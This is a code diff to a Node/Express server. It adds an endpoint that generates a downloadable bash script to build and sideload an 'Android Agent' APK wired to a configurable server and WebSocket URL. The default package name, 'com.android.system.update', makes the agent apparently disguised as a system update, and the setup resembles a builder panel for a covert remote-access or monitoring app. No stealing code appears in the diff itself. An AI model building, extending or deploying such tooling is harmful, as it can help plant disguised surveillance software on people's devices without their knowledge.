@@ -812,6 +812,133 @@ app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
   }
 });
 
+// APK Script Download - generates build script for user to run locally
+app.get('/api/apk/script/:buildId', authMiddleware, async (req, res) => {
+  try {
+    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
+    if (!build) return res.status(404).json({ error: 'Build not found' });
+
+    const safeName = (build.name || 'app').replace(/[^a-zA-Z0-9_]/g, '_');
+    const serverUrl = build.serverUrl || process.env.SERVER_URL || 'http://localhost:5000';
+    const wsUrl = build.wsUrl || serverUrl;
+
+    const script = `#!/bin/bash
+# ============================================
+# Build Script for: ${build.name || 'Android Agent'}
+# Package: ${build.packageName || 'com.android.system.update'}
+# Version: ${build.version || '1.0.0'}
+# Server URL: ${serverUrl}
+# Generated: ${new Date().toISOString()}
+# ============================================
+
+set -e
+
+echo "============================================"
+echo " Building APK: ${build.name || 'Android Agent'}"
+echo " Package: ${build.packageName || 'com.android.system.update'}"
+echo " Version: ${build.version || '1.0.0'}"
+echo "============================================"
+
+# Check for Android SDK
+if [ -z "$ANDROID_HOME" ]; then
+    if [ -d "$HOME/Android/Sdk" ]; then
+        export ANDROID_HOME="$HOME/Android/Sdk"
+    elif [ -d "$HOME/.android/sdk" ]; then
+        export ANDROID_HOME="$HOME/.android/sdk"
+    else
+        echo "ERROR: ANDROID_HOME not set. Please install Android Studio or set ANDROID_HOME."
+        exit 1
+    fi
+fi
+
+echo "Using ANDROID_HOME: $ANDROID_HOME"
+
+# Check for Java
+if ! command -v java &> /dev/null; then
+    echo "ERROR: Java not found. Please install JDK 17+."
+    exit 1
+fi
+
+JAVA_VER=$(java -version 2>&1 | head -1 | cut -d'"' -f2 | cut -d'.' -f1)
+echo "Java version: $(java -version 2>&1 | head -1)"
+
+PROJECT_DIR="$(cd "$(dirname "$0")" && pwd)"
+AGENT_DIR="$PROJECT_DIR/android-agent"
+
+if [ ! -d "$AGENT_DIR" ]; then
+    echo "ERROR: android-agent directory not found in $PROJECT_DIR"
+    echo "Please place this script in the same folder as the android-agent/ directory."
+    exit 1
+fi
+
+# Write config to strings.xml
+STRINGS_FILE="$AGENT_DIR/app/src/main/res/values/strings.xml"
+if [ -f "$STRINGS_FILE" ]; then
+    echo "Updating server URL in strings.xml..."
+    sed -i "s|<string name=\"server_url\">.*</string>|<string name=\"server_url\">${serverUrl}</string>|" "$STRINGS_FILE"
+    sed -i "s|<string name=\"ws_url\">.*</string>|<string name=\"ws_url\">${wsUrl}</string>|" "$STRINGS_FILE"
+    echo "Server URL set to: ${serverUrl}"
+fi
+
+# Build the APK
+echo ""
+echo "Building APK..."
+cd "$AGENT_DIR"
+
+if [ -f "./gradlew" ]; then
+    chmod +x ./gradlew
+    ./gradlew assembleRelease --no-daemon
+else
+    echo "ERROR: gradlew not found. Please use Android Studio or ensure gradlew exists."
+    exit 1
+fi
+
+APK_PATH="$AGENT_DIR/app/build/outputs/apk/release/app-release.apk"
+DEBUG_APK_PATH="$AGENT_DIR/app/build/outputs/apk/debug/app-debug.apk"
+
+if [ -f "$APK_PATH" ]; then
+    echo ""
+    echo "============================================"
+    echo " BUILD SUCCESSFUL!"
+    echo "============================================"
+    echo "APK location: $APK_PATH"
+    echo ""
+    echo "Install on device with:"
+    echo "  adb install -r \"$APK_PATH\""
+    echo ""
+    echo "Or for debug build:"
+    echo "  adb install -r \"$DEBUG_APK_PATH\""
+elif [ -f "$DEBUG_APK_PATH" ]; then
+    echo ""
+    echo "============================================"
+    echo " BUILD SUCCESSFUL (debug only)!"
+    echo "============================================"
+    echo "APK location: $DEBUG_APK_PATH"
+    echo ""
+    echo "Install with:"
+    echo "  adb install -r \"$DEBUG_APK_PATH\""
+else
+    echo ""
+    echo "============================================"
+    echo " BUILD COMPLETED"
+    echo "============================================"
+    echo "Check build output in: $AGENT_DIR/app/build/outputs/apk/"
+fi
+
+echo ""
+echo "To install on connected device:"
+echo "  adb install -r \"$AGENT_DIR/app/build/outputs/apk/release/app-release.apk\" 2>/dev/null || \\"
+echo "  adb install -r \"$AGENT_DIR/app/build/outputs/apk/debug/app-debug.apk\""
+`;
+
+    res.setHeader('Content-Type', 'application/x-sh');
+    res.setHeader('Content-Disposition', `attachment; filename="build_apk_${safeName}.sh"`);
+    res.send(script);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // Stats Routes
 app.get('/api/stats', authMiddleware, async (req, res) => {
   try {
